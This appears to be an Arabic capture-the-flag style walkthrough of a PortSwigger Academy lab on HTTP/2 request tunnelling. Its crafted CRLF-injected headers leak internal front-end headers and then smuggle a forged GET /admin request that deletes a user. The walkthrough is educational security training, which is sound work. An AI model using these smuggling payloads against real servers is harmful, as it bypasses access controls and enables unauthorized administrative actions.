# [Bypassing access controls via HTTP/2 request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling)

## **`الهدف`**
قم بالدخول إلى لوحة التحكم `/admin` بصفتك `administrator` وقم بحذف المستخدم `Carlos`.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater`
```http
GET / HTTP/2
Host: 0a72000a04ede40d80a1a31c00b700f5.web-security-academy.net
Cookie: session=r5nEdw4hd9dJWn6j7LbnR0QL5n8yquCr
```
ثم سنقوم بتنفيذ `HTTP/2 request splitting` بخدعة `Kettled` وهذا يجب أن يتم من داخل `Inspector` عن طريق إضافة ترويسة باسم: 
```http
TEST1: TEST2\r\n
Host:Example.com
```
وتكون قيمتها عشوائية مثل: `TEST3`
وسنجد أن الاستجابة بالفعل حاولت الاتصال بقيمة ترويسة الـ `Host`
```http
HTTP/2 504 Gateway Timeout
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 151

<html>
	<head>
		<title>
			Server Error: Gateway Timeout
			</title>
		</head>
		<body>
			<h1>
			Server Error: Gateway Timeout (3) connecting to Example.com<
			/h1>
	</body>
</html>
```

عند تجربة خاصية البحث في الموقع:
```http
GET /?search=TEST HTTP/2
Host: 0a72000a04ede40d80a1a31c00b700f5.web-security-academy.net
Cookie: session=r5nEdw4hd9dJWn6j7LbnR0QL5n8yquCr
```

سنجد أن قيمته تنعكس في الاستجابة
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5071

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Bypassing access controls via HTTP/2 request tunnelling</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Bypassing access controls via HTTP/2 request tunnelling</h2>
                            <a class=link-back href='https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class=blog-header>
                        <h1>3 search results for 'TEST'</h1>
                        <hr>
                    </section>
                    <section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search>
                            <button type=submit class=button>Search</button>
                        </form>
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/54.jpg"></a>
                        <h2>The First Ever Truly Eco Car Has Made It To Market</h2>
                        <p>Forget electricity, we know that's still a drain on the National Grid. Some clever little inventors in Ohio have come up with a way of getting your car moving with nothing but air. And better still, air from your own...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/21.jpg"></a>
                        <h2>The Do's & Don'ts of Writing Your Resume</h2>
                        <p>We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don't make it a sweaty limp one.</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/19.jpg"></a>
                        <h2>Spider Web Security</h2>
                        <p>Today the President issued a red warning in relation to the breakdown of spider web security. So far all of the main banks and energy suppliers have been hit by this gang of thieves who are now on the run,...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class=is-linkback>
        <a href="/">Back to Blog</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
لذلك سنقوم تعديل الـ `Method` عن طريق الضغط على الـ `Mouse right-click` ونضغط `Change request method` ليصبح `POST`.

بعد ذلك سنقوم بتنفيذ `HTTP/2 request splitting` ولكن بخدعة `Kettled` وهذا يجب أن يتم من داخل `Inspector` عن طريق إضافة ترويسة باسم: 
```http
TEST1: TEST2\r\n
Content-Length: 165\r\n
\r\n
search=TEST3
```
وتكون قيمتها عشوائية مثل: `TEST4`

مع مراعاة أننا سنحتاج إلى عدة تجارب لضبط قيمة الـ `Content-Length: 165` فربما نحتاج للتقليل أو الزيادة أو حتى قد نحتاج لإضافة معلم أخر بقيمة `Search=` في جسم الطلب الأصلي ونزود عدد الأحرف فيه حتى نحصل على الاستجابة بها الترويسات المطلوبة.

وسنجد أن استجابتها بها الترويسات التي يقوم سيرفر الواجهة الخلفية بإضافتها:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=I6fY760ra5HJyzpkrsYVthRtmS5ykQhe; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3554

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Bypassing access controls via HTTP/2 request tunnelling</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Bypassing access controls via HTTP/2 request tunnelling</h2>
                            <a class=link-back href='https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class=blog-header>
                        <h1>0 search results for 'TEST3: TEST4
cookie: session=iymU7ALSU82IQjU2JLSBNEpNmyrkd2Nq
X-SSL-VERIFIED: 0
X-SSL-CLIENT-CN: null
X-FRONTEND-KEY: 5127958915845602
Content-Length: 0
'</h1>
                        <hr>
                    </section>
                    <section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search>
                            <button type=submit class=button>Search</button>
                        </form>
                    </section>
                    <section class="blog-list no-results">
                        <div class=is-linkback>
        <a href="/">Back to Blog</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

والترويسات التي تهمنا هي: `X-SSL-VERIFIED` وسنغير قيمتها من `0` إلى `1`، و `X-SSL-CLIENT-CN` وسنضع قيمتها تساوي `administrator` وترويسة `X-FRONTEND-KEY` بنفس قيمتها الحالية.

بعد ذلك سنقوم بالتوجه إلى أى طلب ولنفترض طلب الدخول إلى اللاب ثم سنقوم بتغيير `GET` إلى `HEAD`
```http
GET / HTTP/2
Host: 0a72000a04ede40d80a1a31c00b700f5.web-security-academy.net
Cookie: session=r5nEdw4hd9dJWn6j7LbnR0QL5n8yquCr
```

بعد ذلك سنقوم بتنفيذ `HTTP/2 request splitting` ولكن بخدعة `Kettled` وهذا يجب أن يتم من داخل `Inspector` عن طريق إضافة ترويسة باسم: 
```http
TEST1: TEST2\r\n
\r\n

GET /admin HTTP/1.1\r\n
X-SSL-VERIFIED: 1\r\n
X-SSL-CLIENT-CN: administrator\r\n
X-FRONTEND-KEY: 5127958915845602\r\n
```
وتكون قيمتها عشوائية مثل: `TEST3`
ولكن سنلاحظ أن هناك مشكلة في الاستجابة بسبب اختلاف عدد البايتس المتوقع استلامهما 
```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Content-Length: 151

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Received only 3712 of expected 8639 bytes of data</h1></body></html>
```

لذلك سنقوم بتجربة مسار أخر عن طريق تغيير الترويسة الزائفة `Path` من `/` إلى `/login`، وسنحصل على استجابة سليمة
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=TAIa6536a73I7GJHssGKmpv5I9b4Wjmv; Secure; HttpOnly; SameSite=None
Content-Length: 3351
X-Frame-Options: SAMEORIGIN

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=sNDnZkl7Sz6EMt3iaAh3FeAb0Op1T5q7; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=0
Content-Length: 3293

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Bypassing access controls via HTTP/2 request tunnelling</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Bypassing access controls via HTTP/2 request tunnelling</h2>
                            <a class=link-back href='https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
    
```
وسنجد أنه لحذف حساب `carlos` يجب أن نقوم بإرسال طلب إلى مسار `/admin/delete?username=carlos`

لذلك سنغير المسار في حقل اسم الترويسة التي قمنا بإضافها من `/admin` إلى `/admin/delete?username=carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Response queue poisoning via H2.TE request smuggling](./Response-queue-poisoning-via-H2.TE-request-smuggling.md)
